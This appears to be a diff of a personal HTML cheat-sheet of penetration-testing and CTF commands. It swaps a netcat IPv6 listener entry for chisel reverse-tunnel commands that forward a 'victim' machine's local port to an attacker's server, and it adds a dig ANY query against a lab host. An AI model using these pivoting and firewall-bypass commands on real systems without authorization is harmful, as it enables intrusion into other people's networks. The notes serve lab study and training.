@@ -9,19 +9,31 @@
    
 </head>
 <body>
-    <h1>netcat IPV6 listener</h1>
+    <h1>chisel</h1>
     <ul>
-        <li><code>$ nc -6 -lvnp Port</code>  <br><br>
-            > <br><br></li>
-        <li><code>$ chisel_x.xx.x_linux_amd64 client yourIP:9000 R:9631:localhost:631 [ victim mcahine]</code> <br><br>
+        <li><code>$ chisel_x.xx.x_linux_amd64 server -p 9000</code><br><br>
+        > set up a reverse tunneling connection between an attacker's machine (server) and a victim's machine (client) <br>
+        > run this command on attacker machine</li>
+        <li><code>$ chisel_x.xx.x_linux_amd64 client yourIP:9000 R:9631:localhost:631</code> <br><br>
         > R:9631:localhost:631: Creates a reverse tunnel <br>
         > R: Indicates reverse port forwarding. <br>
         > 9631: The port on the attacker's machine (server) to be forwarded. <br>
         > localhost:631: The victim’s local port (631) data will be forwarded to attacker & they can access it on their local machine http://IP:9631 
         </li> 
+        <div class="note-box">
+            <div class="note-line"></div>
+            <div class="explanation-box">
+                Chisel is a fast TCP/UDP tunneling tool that works over HTTP and is often used for port forwarding, pivoting, and bypassing firewalls/NAT in red teaming and CTF environments. <br>
+                It is cross-platform (works on Linux, Windows, macOS) and supports both client and server modes.
+            </div>
+          </div>
     </ul>
-    
-    <h1>gobuster</h1>
+   
+    <h1>dig</h1>
+    <ul>
+    <li><code>$ dig any domain.htb @10.10.10.10</code> <br> <br>
+    > sends a DNS query to the server at IP 10.10.10.10, asking for all available DNS records (like A, MX, TXT) for domain.htb</li>
+    </ul>
     <button onclick="goBack()">Back</button>
 
     <script src="note.js"></script>
